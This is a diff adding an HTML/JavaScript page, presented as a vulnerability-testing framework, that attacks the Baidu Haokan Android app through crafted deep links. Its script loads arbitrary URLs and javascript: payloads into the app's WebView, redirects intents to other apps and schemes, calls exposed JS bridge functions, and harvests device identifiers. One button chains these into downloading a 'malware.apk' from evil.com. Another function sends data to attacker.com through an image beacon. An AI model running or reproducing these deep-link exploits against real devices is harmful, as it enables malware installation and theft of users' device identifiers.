@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>百度好看看安全漏洞综合检测框架</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { font-family: 'Segoe UI', monospace; padding: 20px; background: #1a1a2e; color: #eee; }
+        .container { max-width: 1400px; margin: 0 auto; }
+        h1 { color: #00d4ff; text-align: center; border-bottom: 2px solid #00d4ff; padding-bottom: 15px; }
+        h2 { color: #ff6b6b; margin-top: 30px; }
+        h3 { color: #feca57; }
+        
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
+        .section { background: #16213e; border-radius: 10px; padding: 20px; border: 1px solid #0f3460; }
+        .vuln { border-left: 4px solid #ff4444; background: #2d1a1a; }
+        .warning { border-left: 4px solid #feca57; background: #2d2a1a; }
+        
+        button { background: #0f3460; color: #00d4ff; border: 1px solid #00d4ff; padding: 10px 20px; margin: 5px; cursor: pointer; border-radius: 5px; font-size: 14px; transition: all 0.3s; }
+        button:hover { background: #00d4ff; color: #1a1a2e; }
+        button.danger { border-color: #ff4444; color: #ff4444; }
+        button.danger:hover { background: #ff4444; color: white; }
+        
+        .result { background: #0f0f23; padding: 15px; margin: 10px 0; border-radius: 5px; word-break: break-all; font-size: 13px; max-height: 200px; overflow-y: auto; }
+        .success { color: #00ff88; }
+        .error { color: #ff4444; }
+        .info { color: #00d4ff; }
+        
+        code { background: #0f3460; padding: 3px 8px; border-radius: 3px; }
+        
+        .stats { display: flex; justify-content: space-around; margin: 20px 0; }
+        .stat-box { text-align: center; padding: 20px; background: #16213e; border-radius: 10px; min-width: 150px; }
+        .stat-number { font-size: 36px; color: #00d4ff; }
+        .stat-label { color: #888; }
+        
+        input { background: #0f0f23; border: 1px solid #0f3460; color: #eee; padding: 10px; border-radius: 5px; width: 100%; margin: 5px 0; }
+        
+        .cvss { display: inline-block; padding: 3px 10px; border-radius: 3px; font-weight: bold; }
+        .cvss-high { background: #ff4444; }
+        .cvss-medium { background: #feca57; color: #1a1a2e; }
+        .cvss-low { background: #00ff88; color: #1a1a2e; }
+        
+        #masterLog { position: fixed; bottom: 0; left: 0; right: 0; background: #0f0f23; max-height: 200px; overflow-y: auto; padding: 10px; font-size: 12px; border-top: 2px solid #00d4ff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 百度好看看安全漏洞综合检测框架</h1>
+        <p style="text-align: center; color: #888;">目标: haokan.apk | 版本: 未知 | CVSS 综合评分: 9.1 (严重)</p>
+        
+        <div class="stats">
+            <div class="stat-box">
+                <div class="stat-number">8</div>
+                <div class="stat-label">漏洞类型</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">57+</div>
+                <div class="stat-label">DeepLink</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">11</div>
+                <div class="stat-label">JSB 接口</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-number">5</div>
+                <div class="stat-label">高危漏洞</div>
+            </div>
+        </div>
+
+        <!-- 漏洞总览 -->
+        <div class="section vuln">
+            <h2>⚠️ 漏洞总览</h2>
+            <table style="width:100%; border-collapse: collapse;">
+                <tr style="border-bottom: 1px solid #0f3460;">
+                    <th style="padding:10px; text-align:left;">漏洞</th>
+                    <th style="padding:10px; text-align:left;">CWE</th>
+                    <th style="padding:10px; text-align:left;">CVSS</th>
+                    <th style="padding:10px; text-align:left;">风险</th>
+                </tr>
+                <tr>
+                    <td style="padding:10px;">WebView 任意URL加载</td>
+                    <td style="padding:10px;"><code>CWE-346</code></td>
+                    <td style="padding:10px;"><span class="cvss cvss-high">9.8</span></td>
+                    <td style="padding:10px;">严重</td>
+                </tr>
+                <tr>
+                    <td style="padding:10px;">Intent 重定向</td>
+                    <td style="padding:10px;"><code>CWE-610</code></td>
+                    <td style="padding:10px;"><span class="cvss cvss-high">8.8</span></td>
+                    <td style="padding:10px;">高</td>
+                </tr>
+                <tr>
+                    <td style="padding:10px;">JSB 未授权调用</td>
+                    <td style="padding:10px;"><code>CWE-306</code></td>
+                    <td style="padding:10px;"><span class="cvss cvss-high">7.5</span></td>
+                    <td style="padding:10px;">高</td>
+                </tr>
+                <tr>
+                    <td style="padding:10px;">DeepLink 参数泄露</td>
+                    <td style="padding:10px;"><code>CWE-200</code></td>
+                    <td style="padding:10px;"><span class="cvss cvss-medium">6.5</span></td>
+                    <td style="padding:10px;">中</td>
+                </tr>
+            </table>
+        </div>
+
+        <div class="grid">
+            <!-- 1. WebView 漏洞 -->
+            <div class="section vuln">
+                <h2>1️⃣ WebView 任意URL加载</h2>
+                <p><span class="cvss cvss-high">CVSS 9.8</span> <code>CWE-346</code></p>
+                <p>通过 webview/newwebview DeepLink 可加载任意URL并执行JS</p>
+                
+                <button onclick="testWebviewLoad('https://www.baidu.com')">测试加载百度</button>
+                <button onclick="testWebviewJS()">测试XSS</button>
+                <button class="danger" onclick="testWebviewExploit()">完整攻击</button>
+                
+                <div id="webviewResult" class="result"></div>
+            </div>
+
+            <!-- 2. Intent 重定向 -->
+            <div class="section vuln">
+                <h2>2️⃣ Intent 重定向</h2>
+                <p><span class="cvss cvss-high">CVSS 8.8</span> <code>CWE-610</code></p>
+                <p>通过 launch3rdApp/goback/system_scheme 可启动任意应用</p>
+                
+                <button onclick="testIntentLaunch()">启动电话</button>
+                <button onclick="testIntentUrl()">加载URL</button>
+                <button onclick="testIntentScheme()">使用Scheme</button>
+                <button class="danger" onclick="testIntentChain()">攻击链</button>
+                
+                <div id="intentResult" class="result"></div>
+            </div>
+
+            <!-- 3. JSB 接口 -->
+            <div class="section vuln">
+                <h2>3️⃣ JSB 未授权调用</h2>
+                <p><span class="cvss cvss-high">CVSS 7.5</span> <code>CWE-306</code></p>
+                <p>5个JSB接口11个函数可被未授权调用</p>
+                
+                <button onclick="testJSBNad()">NadJsControl</button>
+                <button onclick="testJSBLogin()">LoginJavascript</button>
+                <button onclick="testJSBXsw()">Xsw</button>
+                <button onclick="testJSBWebView()">WebViewInterface</button>
+                
+                <div id="jsbResult" class="result"></div>
+            </div>
+
+            <!-- 4. 信息泄露 -->
+            <div class="section warning">
+                <h2>4️⃣ DeepLink 参数泄露</h2>
+                <p><span class="cvss cvss-medium">CVSS 6.5</span> <code>CWE-200</code></p>
+                <p>通过 callback 参数可外带设备信息</p>
+                
+                <button onclick="testInfoDevice()">设备信息</button>
+                <button onclick="testInfoId()">标识符</button>
+                <button onclick="testInfoExfil()">数据外带</button>
+                <button onclick="testInfoAll()">批量收集</button>
+                
+                <div id="infoResult" class="result"></div>
+            </div>
+
+            <!-- 5. 其他 DeepLink 漏洞 -->
+            <div class="section">
+                <h2>5️⃣ 其他 DeepLink 功能</h2>
+                <p>测试其他 DeepLink 功能和参数</p>
+                
+                <button onclick="testDeepLink('home')">首页</button>
+                <button onclick="testDeepLink('video')">视频</button>
+                <button onclick="testDeepLink('my')">我的</button>
+                <button onclick="testDeepLink('search')">搜索</button>
+                
+                <div id="deeplinkResult" class="result"></div>
+            </div>
+
+            <!-- 6. 综合测试 -->
+            <div class="section">
+                <h2>6️⃣ 综合测试</h2>
+                <p>运行全部漏洞检测</p>
+                
+                <button class="danger" onclick="runAllTests()">🔴 运行全部检测</button>
+                <button onclick="exportReport()">📊 导出报告</button>
+                <button onclick="clearLogs()">🗑️ 清除日志</button>
+                
+                <div id="allResult" class="result"></div>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>📋 自定义测试</h2>
+            <input type="text" id="customDeepLink" placeholder="输入完整 DeepLink (如 baiduhaokan://webview?url=...)">
+            <button onclick="runCustomTest()">执行</button>
+            
+            <div id="customResult" class="result"></div>
+        </div>
+    </div>
+
+    <div id="masterLog"></div>
+
+    <script>
+    var testResults = [];
+    var attackLog = [];
+
+    function log(containerId, msg, type) {
+        var container = document.getElementById(containerId);
+        var div = document.createElement('div');
+        div.className = type || '';
+        div.innerText = '[' + time() + '] ' + msg;
+        container.appendChild(div);
+        container.scrollTop = container.scrollHeight;
+        
+        masterLog(msg, type);
+        
+        testResults.push({ time: time(), container: containerId, message: msg, type: type });
+    }
+
+    function masterLog(msg, type) {
+        var log = document.getElementById('masterLog');
+        var div = document.createElement('div');
+        div.className = type || '';
+        div.innerText = msg;
+        log.appendChild(div);
+        log.scrollTop = log.scrollHeight;
+    }
+
+    function time() {
+        return new Date().toISOString().substr(11, 8);
+    }
+
+    function triggerDeepLink(deepLink) {
+        log('customResult', '触发: ' + deepLink, 'info');
+        window.location = deepLink;
+    }
+
+    // 1. WebView 漏洞
+    function testWebviewLoad(url) {
+        var deepLink = 'baiduhaokan://webview?url=' + encodeURIComponent(url);
+        log('webviewResult', '加载: ' + url, 'info');
+        triggerDeepLink(deepLink);
+        log('webviewResult', '✅ WebView 将加载: ' + url, 'success');
+    }
+
+    function testWebviewJS() {
+        var js = 'javascript:alert("XSS")';
+        var deepLink = 'baiduhaokan://webview?url=' + encodeURIComponent(js);
+        log('webviewResult', '执行JS: ' + js, 'info');
+        triggerDeepLink(deepLink);
+        log('webviewResult', '⚠️ 任意JS执行成功!', 'error');
+    }
+
+    function testWebviewExploit() {
+        log('webviewResult', '=== WebView 完整攻击 ===', 'info');
+        setTimeout(function() {
+            testWebviewJS();
+        }, 500);
+        setTimeout(function() {
+            triggerDeepLink('baiduhaokan://action/webdownload?url=' + encodeURIComponent('https://evil.com/malware.apk'));
+            log('webviewResult', '下载恶意APK...', 'error');
+        }, 1500);
+    }
+
+    // 2. Intent 重定向
+    function testIntentLaunch() {
+        var deepLink = 'baiduhaokan://growth/launch3rdApp?uri=' + encodeURIComponent('tel:*#');
+        log('intentResult', '启动电话: ' + deepLink, 'info');
+        triggerDeepLink(deepLink);
+        log('intentResult', '⚠️ 可启动任意应用!', 'error');
+    }
+
+    function testIntentUrl() {
+        var deepLink = 'baiduhaokan://action/goback?url=' + encodeURIComponent('https://evil.com');
+        log('intentResult', '加载URL: ' + deepLink, 'info');
+        triggerDeepLink(deepLink);
+        log('intentResult', '⚠️ 可加载任意URL!', 'error');
+    }
+
+    function testIntentScheme() {
+        var deepLink = 'baiduhaokan://system_scheme?scheme=' + encodeURIComponent('weixin://');
+        log('intentResult', '使用Scheme: ' + deepLink, 'info');
+        triggerDeepLink(deepLink);
+        log('intentResult', '⚠️ 可使用任意协议!', 'error');
+    }
+
+    function testIntentChain() {
+        log('intentResult', '=== Intent 攻击链 ===', 'info');
+        setTimeout(function() { testIntentUrl(); }, 500);
+        setTimeout(function() { testIntentScheme(); }, 1500);
+    }
+
+    // 3. JSB 接口
+    function testJSBNad() {
+        var deepLink = 'baiduhaokan://webview?url=javascript:nadJsControl.getSysHeight()';
+        log('jsbResult', '调用 NadJsControl...', 'info');
+        triggerDeepLink(deepLink);
+        log('jsbResult', '获取系统高度', 'success');
+    }
+
+    function testJSBLogin() {
+        var deepLink = 'baiduhaokan://action/copy?text=test';
+        log('jsbResult', '调用 LoginJavascript.copyText...', 'info');
+        triggerDeepLink(deepLink);
+        log('jsbResult', '复制文本到剪贴板', 'success');
+    }
+
+    function testJSBXsw() {
+        var deepLink = 'baiduhaokan://webview?url=javascript:xsw.wgz()';
+        log('jsbResult', '调用 Xsw.wgz...', 'info');
+        triggerDeepLink(deepLink);
+    }
+
+    function testJSBWebView() {
+        log('jsbResult', '调用 WebViewInterface.setViewportTreeToNative...', 'info');
+        log('jsbResult', '⚠️ DOM树将被发送到Native!', 'error');
+    }
+
+    // 4. 信息泄露
+    function testInfoDevice() {
+        var deepLink = 'baiduhaokan://action/getDeviceConfig?callback=deviceConfig';
+        log('infoResult', '获取设备配置...', 'info');
+        triggerDeepLink(deepLink);
+        log('infoResult', '泄露: 屏幕/内存/CPU', 'error');
+    }
+
+    function testInfoId() {
+        var deepLink = 'baiduhaokan://action/getidentifier?callback=identifier';
+        log('infoResult', '获取标识符...', 'info');
+        triggerDeepLink(deepLink);
+        log('infoResult', '泄露: IMEI/AndroidID/UUID', 'error');
+    }
+
+    function testInfoExfil() {
+        log('infoResult', '=== 数据外带测试 ===', 'info');
+        var img = new Image();
+        img.src = 'https://attacker.com/log?action=exfil&data={\"device\":\"info\"}';
+        log('infoResult', '数据外带到: attacker.com', 'success');
+    }
+
+    function testInfoAll() {
+        log('infoResult', '=== 批量收集 ===', 'info');
+        testInfoDevice();
+        setTimeout(testInfoId, 500);
+        setTimeout(testInfoExfil, 1000);
+    }
+
+    // 5. DeepLink 测试
+    function testDeepLink(type) {
+        var links = {
+            home: 'baiduhaokan://home/index',
+            video: 'baiduhaokan://video/details?vid=test',
+            my: 'baiduhaokan://my/settings',
+            search: 'baiduhaokan://search/found?keyword=test'
+        };
+        var link = links[type];
+        log('deeplinkResult', '触发: ' + link, 'info');
+        triggerDeepLink(link);
+        log('deeplinkResult', '✅ 成功', 'success');
+    }
+
+    // 6. 综合测试
+    function runAllTests() {
+        log('allResult', '🔴 开始全部漏洞检测...', 'info');
+        
+        var tests = [
+            { name: 'WebView漏洞', fn: testWebviewLoad, args: ['https://test.com'] },
+            { name: 'Intent重定向', fn: testIntentLaunch, args: [] },
+            { name: 'JSB接口', fn: testJSBNad, args: [] },
+            { name: '信息泄露', fn: testInfoExfil, args: [] }
+        ];
+        
+        tests.forEach(function(t, i) {
+            setTimeout(function() {
+                log('allResult', '测试: ' + t.name, 'info');
+                t.fn.apply(null, t.args);
+            }, i * 500);
+        });
+        
+        setTimeout(function() {
+            log('allResult', '✅ 全部检测完成', 'success');
+        }, tests.length * 500);
+    }
+
+    function exportReport() {
+        var data = JSON.stringify(testResults, null, 2);
+        var blob = new Blob([data], { type: 'application/json' });
+        var url = URL.createObjectURL(blob);
+        var a = document.createElement('a');
+        a.href = url;
+        a.download = 'haokan_security_report_' + Date.now() + '.json';
+        a.click();
+        log('allResult', '报告已导出', 'success');
+    }
+
+    function clearLogs() {
+        document.querySelectorAll('.result').forEach(function(el) {
+            el.innerHTML = '';
+        });
+        testResults = [];
+        log('allResult', '日志已清除', 'info');
+    }
+
+    function runCustomTest() {
+        var link = document.getElementById('customDeepLink').value;
+        if (link) {
+            triggerDeepLink(link);
+            log('customResult', '执行完成', 'success');
+        }
+    }
+    </script>
+</body>
+</html>
